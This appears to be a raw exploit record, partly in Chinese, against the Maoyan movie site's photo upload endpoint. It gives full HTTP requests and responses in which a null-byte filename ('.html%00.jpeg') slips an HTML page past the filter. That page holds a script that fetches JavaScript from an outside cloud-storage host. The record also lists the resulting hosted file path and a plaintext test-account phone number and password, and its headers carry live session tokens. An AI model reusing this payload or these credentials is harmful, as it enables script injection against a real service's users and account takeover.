@@ -1,0 +1,118 @@
+
+url：http://m.maoyan.com
+
+
+
+第一个payload：
+POST /file/mmdb/photos/upload.json?_v_=yes HTTP/1.1
+Host: m.maoyan.com
+Accept: */*
+X-Requested-With: superagent
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBDDmiKQ5mLPrcmNC
+Origin: http://m.maoyan.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 TitansX/11.19.30 KNB/1.0 iOS/12.4 imovie/com.meituan.imovie/8.10.1 imovie/8.10.1 App/10410/8.10.1 WKWebView
+Connection: close
+Referer: http://m.maoyan.com/ugc/6/add/342146?uuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010&utm_term=8.10.1&utm_source=AppStore&utm_content=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010&version_name=8.10.1&userid=2715772248&utm_medium=iphone&utm_campaign=AmovieBmovieD100H0&pushToken=dpsh62382ee1bfd52a8e223c054ff97b9902itpu&token=o7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow&language=en&regionid=&_v_=yes&f=iphone&cityId=20&ci=20
+Content-Length: 3733
+Cookie: _utm_campaign=AmovieBmovieD100H0; _utm_content=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; _utm_medium=iphone; _utm_source=AppStore; _utm_term=8.10.1; cityid=20; dpid=; network=wifi; token=o7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow; uuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; selectci=true; theme=maoyan; user=2715772248%2Co7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow; ci=20%2C%E5%B9%BF%E5%B7%9E; iuuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; uid=2715772248
+
+------WebKitFormBoundaryBDDmiKQ5mLPrcmNC
+Content-Disposition: form-data; name="file"; filename="97877104-9118-47AA-8899-A2FEE041949A.html%00.jpeg"
+Content-Type: image/jpeg
+
+document<!DOCTYPE html><html><head><meta charset="UTF-8"><script>function loadJs(t){var e=document.createElement("script");e.setAttribute("src",t),e.setAttribute("charset","utf-8"),document.body?document.body.appendChild(e):document.head.appendChild(e)}var xUrl="https://ttfk.oss-cn-hangzhou.aliyuncs.com/online/g/x.js",now=Math.round(Date.now()/1e3/5);loadJs(xUrl+"?t="+now)</script></head><body hidden>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</body></html>
+------WebKitFormBoundaryBDDmiKQ5mLPrcmNC
+Content-Disposition: form-data; name="html"
+
+1
+------WebKitFormBoundaryBDDmiKQ5mLPrcmNC--
+
+
+
+
+response：
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 16 Oct 2019 06:29:55 GMT
+Content-Type: application/json;charset=UTF-8
+Content-Length: 94
+Connection: close
+m-appkey: com.meituan.movie.mmdb.movie
+m-spanname: /admin/mmdb/photos/upload.json
+m-traceid: -359407153642060999
+
+{"data":[{"olink":"http://vfile.meituan.net/mmdb/f2d3561b64696c38c7c76b51d2b29b083418.jpeg"}]}
+
+
+
+
+==========================================
+
+
+
+第二个payload:
+POST /file/mmdb/photos/upload.json?_v_=yes HTTP/1.1
+Host: m.maoyan.com
+Accept: */*
+X-Requested-With: superagent
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygnmg58pYAeObpsfG
+Origin: http://m.maoyan.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 TitansX/11.19.30 KNB/1.0 iOS/12.4 imovie/com.meituan.imovie/8.10.1 imovie/8.10.1 App/10410/8.10.1 WKWebView
+Connection: close
+Referer: http://m.maoyan.com/ugc/3/add/1243361?uuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010&utm_term=8.10.1&utm_source=AppStore&utm_content=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010&version_name=8.10.1&userid=2715772248&utm_medium=iphone&utm_campaign=AmovieBmovieD100H0&pushToken=dpsh62382ee1bfd52a8e223c054ff97b9902itpu&token=o7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow&language=en&regionid=&_v_=yes&f=iphone&cityId=20&ci=20
+Content-Length: 323049
+Cookie: network=wifi; token=o7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow; selectci=true; theme=maoyan; user=2715772248%2Co7aT809xo-P5fiX_xidLH6CGvFsAAAAAPAkAAEjfOPpnrQBCVCj2HQZVV7FkU4kNfdDiEOmb9wLngPdJnavmMvubVZBW-t-8noo6Ow; _utm_campaign=AmovieBmovieD100H0; _utm_content=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; _utm_medium=iphone; _utm_source=AppStore; _utm_term=8.10.1; cityid=20; dpid=; uuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; _lx_utm=utm_term%3D8.10.1%26utm_source%3DAppStore%26utm_content%3D00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010%26utm_medium%3Diphone%26utm_campaign%3DAmovieBmovieD100H0; _lxsdk=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010; _lxsdk_cuid=16dd3274debc8-081f97463a08828-1f6e672a-3d10d-16dd3274decc8; _lxsdk_s=16dd3274ded-b7e-3a3-6f7%7C%7CNaN; _lxsdk_unoinid=6046d1b8ef6b48608d2694ce6e7e0db30000000000000078010; uid=2715772248; ci=20%2C%E5%B9%BF%E5%B7%9E; iuuid=00000000000006046D1B8EF6B48608D2694CE6E7E0DB30000000000000078010
+
+------WebKitFormBoundarygnmg58pYAeObpsfG
+Content-Disposition: form-data; name="file"; filename="43E47921-F87D-4215-A962-C42E727876B5.jpeg"
+Content-Type: image/jpeg
+
+ÿØÿà
+
+------WebKitFormBoundarygnmg58pYAeObpsfG
+Content-Disposition: form-data; name="thumbnail"
+
+1
+------WebKitFormBoundarygnmg58pYAeObpsfG--
+
+
+
+
+response:
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 16 Oct 2019 06:18:32 GMT
+Content-Type: application/json;charset=UTF-8
+Content-Length: 172
+Connection: close
+m-appkey: com.meituan.movie.mmdb.movie
+m-spanname: /admin/mmdb/photos/upload.json
+m-traceid: -3782727177158913531
+
+{"data":[{"tlink":"http://p0.meituan.net/mmdb/6e8cf9b7d30b599f085480c30e155302283667.jpg","olink":"http://p1.meituan.net/mmdb/be6bb74d07c03c9e8bd67d730f285831322737.jpg"}]}
+
+
+
+
+
+
+
+
+
+==================================================
+
+
+
+
+
+
+目标文件路径：
+http://p0.meituan.com/moviemachine/720e35a6d52b3cfede920026a558ebb43411.html
+
+猫眼电影测试账号：
+17090694839----QQ123456qq
+
